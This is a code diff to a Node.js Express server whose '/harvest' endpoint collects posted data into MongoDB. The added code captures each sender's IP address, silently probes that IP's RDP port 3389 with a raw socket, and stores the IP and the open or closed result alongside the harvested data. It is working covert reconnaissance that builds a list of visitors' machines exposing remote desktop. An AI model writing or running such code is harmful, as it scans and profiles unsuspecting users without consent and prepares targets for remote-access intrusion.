@@ -2,9 +2,35 @@ require('dotenv').config();
 const express = require('express');
 const bodyParser = require('body-parser');
 const { MongoClient } = require('mongodb');
+const net = require('net'); // Import the net module
 
 const app = express();
 const port = 3003;
+
+// Function to check if RDP port (3389) is open
+async function checkRDPPort(ip) {
+  return new Promise((resolve) => {
+    const socket = new net.Socket();
+    socket.setTimeout(1000); // 1 second timeout
+
+    socket.on('connect', () => {
+      socket.destroy();
+      resolve(true); // Port is open
+    });
+
+    socket.on('timeout', () => {
+      socket.destroy();
+      resolve(false); // Connection timed out
+    });
+
+    socket.on('error', (err) => {
+      socket.destroy();
+      resolve(false); // Error, port likely closed or unreachable
+    });
+
+    socket.connect(3389, ip);
+  });
+}
 
 const mongoUrl = process.env.MONGODB_URI;
 if (!mongoUrl) {
@@ -41,7 +67,17 @@ app.post('/harvest', async (req, res) => {
     }
   }
   
-  console.log('Harvested data:', data);
+  // Capture client IP address
+  const clientIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+  data.clientIp = clientIp;
+  console.log('Client IP:', clientIp);
+
+  // Check for open RDP port
+  const isRdpOpen = await checkRDPPort(clientIp);
+  data.rdpOpen = isRdpOpen;
+  console.log(`RDP port 3389 on ${clientIp} is ${isRdpOpen ? 'open' : 'closed'}`);
+  
+  console.log('Harvested data with IP and RDP status:', data);
 
   try {
     const db = client.db();
